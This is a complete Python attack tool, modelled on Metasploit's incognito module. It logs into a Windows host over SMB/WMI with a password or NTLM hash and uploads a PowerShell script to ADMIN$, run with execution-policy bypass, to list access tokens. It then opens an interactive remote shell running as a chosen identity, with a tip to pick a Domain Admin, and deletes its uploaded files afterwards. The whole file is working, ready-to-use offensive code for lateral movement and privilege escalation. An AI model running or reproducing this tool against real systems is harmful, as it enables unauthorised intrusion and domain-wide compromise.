#!/usr/bin/env python3
"""
Token Impersonation Shell
Mirrors Metasploit's incognito module:
  1. Connect via SMB/WMI as any admin account
  2. list_tokens  — show delegation + impersonation tokens
  3. impersonate_token — open shell running as chosen identity

Usage:
    python3 token_shell.py
    python3 token_shell.py --debug
"""

import sys
import os
import io
import time
import json
import logging
import getpass
import traceback
import random
import string
import threading
import re
import signal
import errno

# ── Signal handling for graceful shutdown (SIGTERM/SIGBREAK only) ──
def _signal_handler(signum, frame):
    print("\n[!] Terminated by signal %d. Shutting down..." % signum)
    sys.exit(128 + signum)

signal.signal(signal.SIGTERM, _signal_handler)
if hasattr(signal, "SIGBREAK"):
    signal.signal(signal.SIGBREAK, _signal_handler)
# NOTE: We do NOT trap SIGINT. Ctrl+C raises KeyboardInterrupt naturally,
# which is caught cleanly by the try/except blocks.

try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dtypes import NULL
except ImportError:
    print("[!] impacket not found.  pip install impacket")
    sys.exit(1)

DEBUG      = "--debug" in sys.argv
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PS_LOCAL   = os.path.join(SCRIPT_DIR, "get_tokens.ps1")
SHARE      = "ADMIN$"
TMP_WIN    = "C:\\Windows\\Temp\\"
TMP_SMB    = r"\\Temp\\"


# ── Colours ───────────────────────────────────────────────────────────────────
class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    CYAN="\033[96m"; BOLD="\033[1m"; RESET="\033[0m"

def info(m):  print(f"  {C.CYAN}[*]{C.RESET} {m}")
def ok(m):    print(f"  {C.GREEN}[+]{C.RESET} {m}")
def warn(m):  print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def err(m):   print(f"  {C.RED}[-]{C.RESET} {m}")


# ── Spinner ───────────────────────────────────────────────────────────────────
class Spinner:
    FRAMES = ["\u283b","\u2839","\u2838","\u2830","\u282c","\u2824","\u2826","\u2827","\u2807","\u280f"]
    def __init__(self, label):
        self.label   = label
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._spin, daemon=True)
    def __enter__(self):
        self._thread.start(); return self
    def __exit__(self, *_):
        self._stop.set(); self._thread.join()
        print(f"\r  {C.GREEN}[+]{C.RESET} {self.label} done.{' '*20}")
    def _spin(self):
        i = 0
        while not self._stop.is_set():
            print(f"\r  {C.CYAN}{self.FRAMES[i%len(self.FRAMES)]}{C.RESET}"
                  f"  {self.label} ...", end="", flush=True)
            time.sleep(0.1); i += 1


# ── Banner ────────────────────────────────────────────────────────────────────
def banner():
    print(f"""{C.BOLD}{C.CYAN}
  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557
  \u2551         Token Impersonation Shell                \u2551
  \u2551   Mirrors Metasploit incognito module            \u2551
  \u2551   list_tokens \u2192 impersonate_token \u2192 shell        \u2551
  \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d
{C.RESET}""")


# ── Input helpers ─────────────────────────────────────────────────────────────
def prompt(label, default=None, secret=False):
    d = f"  {C.BOLD}{label}{C.RESET}"
    if default: d += f" [{default}]"
    d += ": "
    try:
        v = getpass.getpass(d) if secret else input(d).strip()
    except (KeyboardInterrupt, EOFError):
        print(); sys.exit(0)
    except SystemExit:
        raise
    except Exception as e:
        err(f"Input error: {e}")
        sys.exit(1)
    return v if v else default

def choose(label, options, default=None):
    print(f"\n  {C.BOLD}{label}{C.RESET}")
    for i, o in enumerate(options, 1):
        m = f"{C.GREEN}*{C.RESET}" if o == default else " "
        print(f"    {m} {i}. {o}")
    while True:
        try:
            raw = input(f"  Choice [{default or '1'}]: ").strip()
        except (KeyboardInterrupt, EOFError):
            print(); sys.exit(0)
        except SystemExit:
            raise
        except Exception as e:
            err(f"Input error: {e}")
            continue
        if not raw and default: return default
        if not raw: return options[0]
        if raw.isdigit() and 1 <= int(raw) <= len(options):
            return options[int(raw)-1]
        warn("Invalid choice.")

def pick_int(label, max_val):
    while True:
        try:
            raw = input(f"  {label}: ").strip()
        except (KeyboardInterrupt, EOFError):
            print(); sys.exit(0)
        except SystemExit:
            raise
        except Exception as e:
            err(f"Input error: {e}")
            continue
        if raw.isdigit() and 0 <= int(raw) <= max_val:
            return int(raw)
        warn(f"Enter 0\u2013{max_val}.")


# ── Input validation helpers ──────────────────────────────────

def _validate_non_empty(value, label="Value"):
    if not value or not value.strip():
        raise ValueError(f"{label} cannot be empty.")


def _validate_ip(value):
    _validate_non_empty(value, "IP")
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if not re.match(pattern, value):
        raise ValueError("Invalid IP format. Expected: 192.168.1.10")
    parts = value.split(".")
    for part in parts:
        try:
            num = int(part)
        except ValueError:
            raise ValueError("IP contains non-numeric octets.")
        if not 0 <= num <= 255:
            raise ValueError("IP octets must be 0-255.")


def _validate_username(value):
    _validate_non_empty(value, "Username")
    if not re.match(r"^[a-zA-Z0-9._\-$]+$", value):
        raise ValueError("Username contains invalid characters.")


def _validate_hash(value):
    _validate_non_empty(value, "Hash")
    if ":" not in value:
        raise ValueError("Hash must be in LM:NT format.")
    lm, nt = value.split(":", 1)
    if len(lm) != 32 or len(nt) != 32:
        raise ValueError("LM and NT hashes must each be 32 hex chars.")
    if not all(c in "0123456789abcdefABCDEF" for c in lm + nt):
        raise ValueError("Hash contains non-hex characters.")


# ── Credentials ───────────────────────────────────────────────────────────────
def collect_creds():
    print(f"\n{C.BOLD}  \u2500\u2500 Target \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{C.RESET}")

    while True:
        ip = prompt("Target IP")
        if not ip:
            err("IP required.")
            continue
        try:
            _validate_ip(ip)
            break
        except ValueError as ve:
            err(str(ve))
            continue

    dom  = prompt("Domain (blank = local)", default="")
    user = prompt("Username", default="Administrator")
    if not user:
        err("Username required."); sys.exit(1)

    print(f"\n{C.BOLD}  \u2500\u2500 Auth \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{C.RESET}")
    mode = choose("Method", ["Password", "NTLM hash (LM:NT)", "No password"],
                  default="Password")
    pw = lm = nt = ""
    if mode == "Password":
        pw = prompt("Password", secret=True) or ""
    elif mode == "NTLM hash (LM:NT)":
        while True:
            raw = prompt("Hash (LM:NT)")
            try:
                _validate_hash(raw)
                lm, nt = raw.split(":", 1)
                break
            except ValueError as ve:
                err(str(ve))
                continue
    return ip, dom, user, pw, lm, nt


# ── SMB / WMI helpers ─────────────────────────────────────────────────────────
def smb_connect(ip, user, pw, dom, lm, nt):
    try:
        c = SMBConnection(ip, ip)
        c.login(user, pw, dom, lm, nt)
        return c
    except Exception as e:
        err(f"SMB connection failed: {e}")
        raise

def wmi_connect(ip, user, pw, dom, lm, nt):
    try:
        dcom  = DCOMConnection(ip, user, pw, dom, lm, nt,
                               oxidResolver=True, doKerberos=False)
        iface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,
                                        wmi.IID_IWbemLevel1Login)
        login = wmi.IWbemLevel1Login(iface)
        iw    = login.NTLMLogin("//./root/cimv2", NULL, NULL)
        login.RemRelease()
        return dcom, iw
    except Exception as e:
        err(f"WMI connection failed: {e}")
        raise

def wmi_exec(iw, cmd, cwd="C:\\Windows\\System32"):
    try:
        pc = iw.GetObject("Win32_Process")
        if isinstance(pc, tuple): pc = pc[0]
        r  = pc.Create(cmd, cwd, None)
        if isinstance(r, tuple): r = r[0]
        props = r.getProperties() if hasattr(r, "getProperties") else {}
        return (props.get("ReturnValue", {}).get("value", -1),
                props.get("ProcessId",   {}).get("value",  0))
    except Exception as e:
        err(f"WMI exec failed: {e}")
        raise

def smb_read(smb, smb_path, timeout=60):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            buf = []
            smb.getFile(SHARE, smb_path, buf.append)
            return b"".join(buf)
        except Exception:
            pass
        time.sleep(0.5)
    return None

def smb_delete(smb, smb_path):
    try:
        smb.deleteFile(SHARE, smb_path)
    except Exception:
        pass

def rand_name(prefix, ext, n=8):
    r = "".join(random.choices(string.ascii_lowercase, k=n))
    return f"{prefix}_{r}.{ext}"

def ps_cmd(ps_win, extra_args=""):
    return (f'powershell.exe -NonInteractive -ExecutionPolicy Bypass '
            f'-File "{ps_win}" {extra_args}')


# ── Upload get_tokens.ps1 and return its remote name ─────────────────────────
def upload_ps(smb, ps_name=None):
    if ps_name is None:
        ps_name = rand_name("tok", "ps1")
    try:
        with open(PS_LOCAL, "rb") as f:
            data = f.read()
    except FileNotFoundError:
        err(f"get_tokens.ps1 not found at {PS_LOCAL}")
        raise
    except OSError as e:
        err(f"Cannot read get_tokens.ps1: {e}")
        raise
    try:
        smb.putFile(SHARE, f"{TMP_SMB}{ps_name}", io.BytesIO(data).read)
    except Exception as e:
        err(f"SMB upload failed: {e}")
        raise
    return ps_name


# ── STEP 1: list_tokens ───────────────────────────────────────────────────────
def list_tokens(ip, user, pw, dom, lm, nt):
    if not os.path.isfile(PS_LOCAL):
        raise FileNotFoundError(f"get_tokens.ps1 not found at {PS_LOCAL}")

    smb      = None
    dcom     = None
    iw       = None
    ps_name  = None
    out_name = None

    try:
        smb = smb_connect(ip, user, pw, dom, lm, nt)
        ps_name  = rand_name("tok", "ps1")
        out_name = rand_name("out", "txt")
        ps_win   = TMP_WIN + ps_name
        out_win  = TMP_WIN + out_name

        with Spinner("Uploading get_tokens.ps1"):
            upload_ps(smb, ps_name)

        dcom, iw = wmi_connect(ip, user, pw, dom, lm, nt)
        cmd = ps_cmd(ps_win, f'-Mode enum -OutFile "{out_win}"')

        with Spinner("Running list_tokens on target"):
            rv, pid = wmi_exec(iw, cmd)
        info(f"PowerShell PID {pid}  (return={rv})")

        with Spinner("Waiting for token list"):
            raw = smb_read(smb, f"{TMP_SMB}{out_name}", timeout=90)

        if raw is None:
            raise RuntimeError("No output received — script may have crashed on target.")

        try:
            tokens = json.loads(raw.decode("utf-8-sig", errors="replace"))
        except json.JSONDecodeError as e:
            raise RuntimeError(f"Invalid JSON from target: {e}")

        if tokens and isinstance(tokens, list) and len(tokens) > 0 and "error" in tokens[0]:
            raise RuntimeError(tokens[0]["error"])

        return tokens

    finally:
        # Cleanup in finally block so it always runs
        if iw:
            try: iw.RemRelease()
            except Exception: pass
        if dcom:
            try: dcom.disconnect()
            except Exception: pass
        if smb:
            if ps_name:
                smb_delete(smb, f"{TMP_SMB}{ps_name}")
            if out_name:
                smb_delete(smb, f"{TMP_SMB}{out_name}")
            try: smb.logoff()
            except Exception: pass


# ── STEP 2: display tokens ────────────────────────────────────────────────────
def display_tokens(tokens):
    if not isinstance(tokens, list):
        err("Invalid token data format (expected list).")
        return []

    delegation    = [t for t in tokens if isinstance(t, dict) and t.get("level") == "Delegation"]
    impersonation = [t for t in tokens if isinstance(t, dict) and t.get("level") != "Delegation"]
    all_tokens    = []

    sep = f"  {'\u2500'*74}"

    def print_section(title, hint, items, colour):
        nonlocal all_tokens
        print(f"\n  {C.BOLD}{colour}{title}{C.RESET}  {C.YELLOW}{hint}{C.RESET}")
        print(sep)
        if items:
            print(f"  {C.BOLD}{'#':<4} {'Identity':<42} {'PIDs':<5} Sample procs{C.RESET}")
            print(sep)
            for t in items:
                if not isinstance(t, dict):
                    continue
                idx   = len(all_tokens); all_tokens.append(t)
                ident = t.get("identity", "UNKNOWN")
                procs = ", ".join(t.get("procs", []))
                pid_count = t.get("pid_count", 0)
                print(f"  {colour}{idx:<4}{C.RESET} {ident:<42} "
                      f"{pid_count:<5} {procs}")
        else:
            print(f"  {C.YELLOW}(none){C.RESET}")

    print_section(
        "Delegation Tokens Available",
        "interactive logon — full impersonation",
        delegation, C.CYAN
    )
    print_section(
        "Impersonation Tokens Available",
        "service / network logon — limited",
        impersonation, C.GREEN
    )
    print()
    return all_tokens


# ── STEP 3: impersonate_token shell ──────────────────────────────────────────
class ImpersonatedShell:
    r"""
    Each command:
      1. Calls Incognito::ImpersonateToken() via the uploaded PS1
      2. ImpersonateToken() uses CreateProcessAsUserW with a duplicated
         PRIMARY token — the child genuinely runs as that identity
      3. Output is read back via SMB
      4. CWD is tracked locally and resolved against the remote host
         so relative paths (cd .., cd \Windows, etc.) all work correctly
    """
    def __init__(self, ip, user, pw, dom, lm, nt, identity):
        self.ip       = ip
        self.user     = user
        self.pw       = pw
        self.dom      = dom
        self.lm       = lm
        self.nt       = nt
        self.identity = identity
        self._smb     = None
        self._dcom    = None
        self._iw      = None
        self._ps_name = None
        self._cwd     = "C:\\Windows\\System32"

    # ── Connection ────────────────────────────────────────────────────────────
    def connect(self):
        try:
            info("Connecting SMB ...")
            self._smb = smb_connect(
                self.ip, self.user, self.pw, self.dom, self.lm, self.nt)
            ok("SMB ready.")
        except Exception as e:
            err(f"SMB connection failed: {e}")
            raise

        try:
            info("Connecting WMI ...")
            self._dcom, self._iw = wmi_connect(
                self.ip, self.user, self.pw, self.dom, self.lm, self.nt)
            ok("WMI ready.")
        except Exception as e:
            err(f"WMI connection failed: {e}")
            raise

        try:
            info("Uploading TokenUtils library ...")
            self._ps_name = rand_name("inc", "ps1")
            upload_ps(self._smb, self._ps_name)
            ok("Library uploaded.")
        except Exception as e:
            err(f"Upload failed: {e}")
            raise

    # ── Core remote runner ────────────────────────────────────────────────────
    def _run_remote(self, command, cwd, timeout=30):
        """
        Run a single command on the remote host via WMI + token impersonation.
        Returns raw bytes of combined stdout+stderr, or None on timeout.
        b"" is a valid return (empty output from a successful command).
        """
        out_name  = rand_name("co",   "txt")
        done_name = rand_name("done", "txt")
        out_win   = TMP_WIN + out_name
        done_win  = TMP_WIN + done_name
        ps_win    = TMP_WIN + self._ps_name

        esc_id  = self.identity.replace('"', '`"')
        esc_cmd = command.replace('"', '`"')

        if len(cwd) >= 3 and re.match(r'^[A-Za-z]:\\', cwd):
            safe_cwd = cwd.rstrip('\\') if len(cwd) > 3 else cwd.replace('\\', '/')
        else:
            safe_cwd = "C:/Windows/System32"

        args = (f'-Mode impersonate '
                f'-Identity "{esc_id}" '
                f'-Command "{esc_cmd}" '
                f'-CmdOut "{out_win}" '
                f'-DoneFile "{done_win}" '
                f'-Cwd "{safe_cwd}"')

        cmd = ps_cmd(ps_win, args)
        try:
            wmi_exec(self._iw, cmd)
        except Exception as e:
            err(f"WMI exec failed: {e}")
            return None

        SENTINEL_WAIT = min(timeout, 35)
        sentinel = smb_read(self._smb, f"{TMP_SMB}{done_name}",
                            timeout=SENTINEL_WAIT)
        smb_delete(self._smb, f"{TMP_SMB}{done_name}")

        if sentinel is not None:
            buf = []
            try:
                self._smb.getFile(SHARE, f"{TMP_SMB}{out_name}", buf.append)
            except Exception:
                pass
            smb_delete(self._smb, f"{TMP_SMB}{out_name}")
            return b"".join(buf)

        time.sleep(2)
        raw = smb_read(self._smb, f"{TMP_SMB}{out_name}",
                       timeout=max(timeout - SENTINEL_WAIT, 5))
        smb_delete(self._smb, f"{TMP_SMB}{out_name}")
        return raw

    # ── cd resolution (fixed) ─────────────────────────────────────────────────
    def _resolve_cd(self, target):
        target = target.strip().strip('"').strip("'").replace('/', '\\')

        if re.match(r'^[A-Za-z]:\\', target):
            candidate = target
        elif re.match(r'^[A-Za-z]:$', target):
            candidate = target + '\\'
        elif target.startswith('\\'):
            drive     = self._cwd[:2]
            candidate = drive + target
        else:
            parts = self._cwd.rstrip('\\').split('\\')
            for part in target.split('\\'):
                part = part.strip()
                if part == '..':
                    if len(parts) > 1:
                        parts.pop()
                elif part and part != '.':
                    parts.append(part)
            candidate = '\\'.join(parts)
            if len(candidate) == 2 and candidate[1] == ':':
                candidate += '\\'

        while '\\\\' in candidate:
            candidate = candidate.replace('\\\\', '\\')

        return candidate

    # ── Command dispatcher ────────────────────────────────────────────────────
    def execute(self, command):
        stripped = command.strip()

        cd_match = re.match(
            r'^cd(?:\s+(?:/d\s+)?(.+))?$', stripped, re.IGNORECASE)

        if cd_match:
            target = (cd_match.group(1) or "").strip().strip('"')

            if not target:
                print(self._cwd)
                return

            self._cwd = self._resolve_cd(target)
            print(self._cwd)
            return

        try:
            raw = self._run_remote(stripped, self._cwd)
        except Exception as e:
            err(f"Command execution failed: {e}")
            return

        if raw is None:
            warn("No output received — sentinel never arrived.")
            warn("Add-Type (C# compile) may have failed on the remote host.")
            warn("Type 'debug' to inspect leftover files in C:\\Windows\\Temp.")
        else:
            try:
                text = raw.decode("utf-8", errors="replace").rstrip()
            except Exception as e:
                text = f"[decode error: {e}]"
            if text:
                print(text)

    # ── Debug helper ──────────────────────────────────────────────────────────
    def _debug_temp(self):
        info("Listing C:\\Windows\\Temp over SMB ...")
        try:
            files = self._smb.listPath(SHARE, r"\\Temp\\*")
            txt   = [f.get_longname() for f in files
                     if f.get_longname().endswith(".txt")]
            if txt:
                ok(f"Found {len(txt)} .txt files in Temp:")
                for name in txt:
                    buf = []
                    try:
                        self._smb.getFile(SHARE, rf"\\Temp\\{name}", buf.append)
                        content = b"".join(buf).decode("utf-8", errors="replace").strip()
                        short   = content[:300] + ("..." if len(content) > 300 else "")
                        print(f"    {C.YELLOW}{name}{C.RESET}: {short}")
                    except Exception as e:
                        print(f"    {C.YELLOW}{name}{C.RESET}: (unreadable: {e})")
                try:
                    ans = input(f"  Delete all {len(txt)} leftover .txt files? [y/N]: ").strip().lower()
                except (KeyboardInterrupt, EOFError):
                    ans = "n"
                except SystemExit:
                    raise
                except Exception as e:
                    err(f"Input error: {e}")
                    ans = "n"
                if ans == "y":
                    for name in txt:
                        smb_delete(self._smb, rf"\\Temp\\{name}")
                    ok("Cleaned up.")
            else:
                warn("No .txt files found — PS1 may have crashed before writing anything.")
        except Exception as e:
            err(f"SMB listPath failed: {e}")

    # ── Interactive loop ──────────────────────────────────────────────────────
    def run(self):
        def prompt_str():
            return (f"{C.BOLD}{C.CYAN}"
                    f"{self.identity}@{self.ip} "
                    f"{C.YELLOW}{self._cwd}"
                    f"{C.RESET}> ")

        print(f"\n  {C.GREEN}Shell ready.{C.RESET}  "
              f"Running as {C.BOLD}{self.identity}{C.RESET}. "
              f"Type 'exit' to quit.  Type 'debug' to inspect remote temp files.\n")

        while True:
            try:
                cmd_in = input(prompt_str()).strip()
            except (KeyboardInterrupt, EOFError):
                print(); break
            except SystemExit:
                raise
            except Exception as e:
                err(f"Shell input error: {e}")
                break
            if not cmd_in:
                continue
            if cmd_in.lower() in ("exit", "quit"):
                break
            if cmd_in.lower() == "debug":
                self._debug_temp()
                continue
            try:
                self.execute(cmd_in)
            except Exception as e:
                err(f"Command error: {e}")

    # ── Cleanup ───────────────────────────────────────────────────────────────
    def cleanup(self):
        if self._smb and self._ps_name:
            smb_delete(self._smb, f"{TMP_SMB}{self._ps_name}")
        try:
            if self._iw:   self._iw.RemRelease()
        except Exception:
            pass
        try:
            if self._dcom: self._dcom.disconnect()
        except Exception:
            pass
        try:
            if self._smb:  self._smb.logoff()
        except Exception:
            pass


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    banner()
    if DEBUG:
        logging.basicConfig(level=logging.DEBUG)
        warn("Debug mode ON")
    else:
        logging.basicConfig(level=logging.WARNING)

    if not os.path.isfile(PS_LOCAL):
        err(f"get_tokens.ps1 not found in {SCRIPT_DIR}")
        err("Place get_tokens.ps1 in the same directory as this script.")
        sys.exit(1)

    ip, dom, user, pw, lm, nt = collect_creds()

    info(f"Testing SMB to {ip} ...")
    try:
        c = smb_connect(ip, user, pw, dom, lm, nt)
        ok(f"SMB OK — {c.getServerName()}  ({c.getServerOS()})")
        c.logoff()
    except Exception as e:
        err(f"SMB failed: {e}"); sys.exit(1)

    # ── list_tokens ───────────────────────────────────────────────────────────
    print(f"\n{C.BOLD}  \u2500\u2500 list_tokens \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{C.RESET}")
    try:
        tokens = list_tokens(ip, user, pw, dom, lm, nt)
    except FileNotFoundError as e:
        err(f"Missing file: {e}")
        sys.exit(1)
    except RuntimeError as e:
        err(f"list_tokens failed: {e}")
        if DEBUG: traceback.print_exc()
        sys.exit(1)
    except Exception as e:
        err(f"list_tokens failed unexpectedly: {e}")
        if DEBUG: traceback.print_exc()
        sys.exit(1)

    all_tokens = display_tokens(tokens)
    if not all_tokens:
        err("No tokens found."); sys.exit(1)

    # ── impersonate_token ─────────────────────────────────────────────────────
    print(f"{C.BOLD}  \u2500\u2500 impersonate_token \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500{C.RESET}")
    print(f"  {C.YELLOW}Tip:{C.RESET} Delegation = interactive logon (strongest). "
          "Pick a Domain Admin for full access.\n")
    idx      = pick_int(f"Token # (0\u2013{len(all_tokens)-1})", len(all_tokens)-1)
    chosen   = all_tokens[idx]
    identity = chosen.get("identity", "UNKNOWN")

    print(f'\n  {C.BOLD}impersonate_token {C.CYAN}"{identity}"{C.RESET}\n')

    shell = ImpersonatedShell(ip, user, pw, dom, lm, nt, identity)
    try:
        with Spinner("Connecting"):
            shell.connect()
        shell.run()
    except KeyboardInterrupt:
        print()
    except SystemExit:
        raise
    except Exception as e:
        err(f"Shell error: {e}")
        if DEBUG: traceback.print_exc()
    finally:
        info("Cleaning up ...")
        shell.cleanup()
        ok("Done.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Exiting cleanly.")
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as e:
        err(f"Unhandled exception: {e}")
        if DEBUG:
            traceback.print_exc()
        sys.exit(1)
